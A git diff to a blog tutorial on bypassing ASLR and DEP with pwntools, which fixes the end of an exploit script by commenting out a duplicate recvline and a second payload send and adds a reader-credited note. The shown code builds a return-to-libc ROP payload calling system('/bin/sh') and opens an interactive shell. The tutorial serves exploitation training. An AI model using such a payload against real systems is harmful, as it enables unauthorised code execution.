@@ -239,9 +239,10 @@ sh_libc_address = puts_libc_address - puts_libc_offset + sh_libc_offset
 payload = 'A'*56 + p64(pop_rdi_ret_address) + p64(sh_libc_address) + p64(system_libc_address) + p64(main_address)
 
 r.sendline(payload)
-print(r.recvline()) # hi there
 
-r.sendline(payload)
+#print(r.recvline()) 
+
+#r.sendline(payload)
 
 r.interactive()
 ```
@@ -249,7 +250,7 @@ r.interactive()
 
 ## Small Proof-Of-Concept
 
-If you followed the steps correctly, you should achieve something like this:
+If you followed the steps correctly, you should achieve something like this. Upon receiving an email (thanks Stefan), I noticed that in my script I have one too many `recvline()` instructions - and I'm sending the payload twice; this causes the weird message in the shell about a file not being found (see the last 2 commented lines in the code above). Fixed now.
 
 {% include image.html url="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_poc_shell.webp" description="Proof-Of-Concept: Shell spawned inside a Process with ASLR and DEP" %}
 
